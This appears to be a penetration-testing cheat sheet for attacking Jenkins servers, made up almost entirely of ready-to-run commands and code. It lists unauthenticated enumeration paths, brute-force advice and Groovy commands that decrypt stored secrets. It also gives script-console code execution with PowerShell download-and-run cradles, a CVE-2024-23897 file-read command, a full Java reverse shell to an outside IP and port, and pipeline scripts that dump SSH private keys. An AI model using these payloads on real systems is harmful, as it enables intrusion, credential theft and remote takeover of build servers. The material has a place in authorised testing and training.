# Jenkins

{% hint style="info" %}
Always check Manage Jenkins > Credentials
{% endhint %}

## Enumeration

```sh
# PATHS TO CHECK WITHOUT AUTHENTICATION
/people
/asynchPeople # list the current users
/securityRealm/user/admin/search/index?q=
# Find Jenkins version
/oops
/error
# METASPLOIT MODULES
msf> use auxiliary/scanner/http/jenkins_enum 
msf> use auxiliary/scanner/http/jenkins_command # check unauthenticated RCE
```

## **Interesting files / Credentials / decryption**

```bash
https://looselytyped.com/blog/2017/10/25/uncovering-passwords-in-jenkins/
IMPORTANT: to find more secrets, play locally with docker container
docker run -p 8080:8080 --name myjenkins jenkins
# Set up our local Jenkins and create a user, then look for its files
docker ps # note names column
docker exec -it $container_name bash

https://github.com/hoto/jenkins-credentials-decryptor
$JENKINS_HOME/userContent
$JENKINS_HOME/secrets/initialAdminPassword
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret

# If we have Jenkins authentication, decrypt secrets from Jenkins console
println(hudson.util.Secret.decrypt("{XXX=}")) 
# or: 
println(hudson.util.Secret.fromString("{XXX=}").getPlainText()) 
# where {XXX=} is your encrypted password. This will print the plain password.

https://github.com/hoto/jenkins-credentials-decryptor
# We need access to those files
```

## **Brute force**

**Jenkins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used (even **usernames as passwords** or **reverse** usernames as passwords).

```bash
msf> use auxiliary/scanner/http/jenkins_login

# USE common users as admin, user, root and usernames collected from the system

# USE rockyou-10.txt (common 100-200 passwords)
```

## RCE

Perhaps the best way. Less noisy.

1. Go to _path\_jenkins/script_
2. Inside the text box introduce the script

{% code overflow="wrap" fullWidth="true" %}
```bash
# WINDOWS
def process = "PowerShell.exe cmd.exe /c dir".execute()
println "Found text ${process.text}"
# -----Good option
def process = "PowerShell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Inv-Pow.ps1')".execute()
println "Found text ${process.text}"

# LINUX
println "ls /".execute().text

# If you need to use quotes and single quotes inside the text. 
# You can use """PAYLOAD""" (triple double quotes) to execute the payload.
```
{% endcode %}

Another way:

```c
New Item > Enter an item name > Access
Build Triggers > Execute Windows batch command
Left menu > Build Now > Console Output
```

### Exploits

CVE-2024-23897

```sh
$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ connect-node @/etc/passd
```

## Reverse shells

{% code overflow="wrap" fullWidth="true" %}
```bash
# LINUX
String host="10.11.17.165";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# WINDOWS
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
{% endcode %}

## Pipelines -> Retrieve SSH keys (example, authenticated)

<pre data-overflow="wrap" data-full-width="true"><code>https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
<strong>
</strong><strong>
</strong><strong>New Items > Pipeline
</strong>
Script >

pipeline {
	agent any
	stages {
		stage ('Deploy') {
			steps{
				sshagent(credentials : ['1']) {
				    sh 'ssh -o StrictHostKeyChecking=no user@hostname.com "cat /root/.ssh/id_rsa"'
				}
			}
		}
	}
} 

Save > Build Now > Console Output

# Another option if that SSH key is not valid for SSH and we just want to retrieve it
pipeline {
	agent any
	stages {
		stage ('Deploy') {
			steps{
				script {
					keyvar = null
					withCredentials([sshUserPrivateKey(credentialsId: '1', keyFileVariable: 'sshKey')]) {
						keyVar = sh "cat ${sshKey}"
					}
				}	echo "${keyVar}"
			}
		}
	}
} 
</code></pre>
